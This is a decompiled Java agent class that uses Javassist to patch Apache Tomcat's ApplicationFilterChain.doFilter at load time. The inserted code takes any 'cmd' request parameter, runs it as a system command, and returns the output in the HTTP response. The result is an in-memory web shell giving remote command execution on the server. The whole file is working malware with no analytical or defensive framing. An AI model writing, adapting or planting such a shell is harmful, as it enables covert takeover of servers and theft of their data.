//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.agent;

import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    public static String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public MyTransformer() {
    }

    public byte[] transform(ClassLoader loader, String className, Class<?> aClass, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace('/', '.');
        if (className.equals(ClassName)) {
            ClassPool cp = ClassPool.getDefault();
            if (aClass != null) {
                ClassClassPath classPath = new ClassClassPath(aClass);
                cp.insertClassPath(classPath);
            }

            try {
                CtClass cc = cp.get(className);
                CtMethod m = cc.getDeclaredMethod("doFilter");
                m.insertBefore(" javax.servlet.ServletRequest req = request;\n            javax.servlet.ServletResponse res = response;String cmd = req.getParameter(\"cmd\");\nif (cmd != null) {\nProcess process = Runtime.getRuntime().exec(cmd);\njava.io.BufferedReader bufferedReader = new java.io.BufferedReader(\nnew java.io.InputStreamReader(process.getInputStream()));\nStringBuilder stringBuilder = new StringBuilder();\nString line;\nwhile ((line = bufferedReader.readLine()) != null) {\nstringBuilder.append(line + '\\n');\n}\nres.getOutputStream().write(stringBuilder.toString().getBytes());\nres.getOutputStream().flush();\nres.getOutputStream().close();\n}");
                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            } catch (IOException | CannotCompileException | NotFoundException var10) {
                var10.printStackTrace();
            }
        }

        return new byte[0];
    }
}
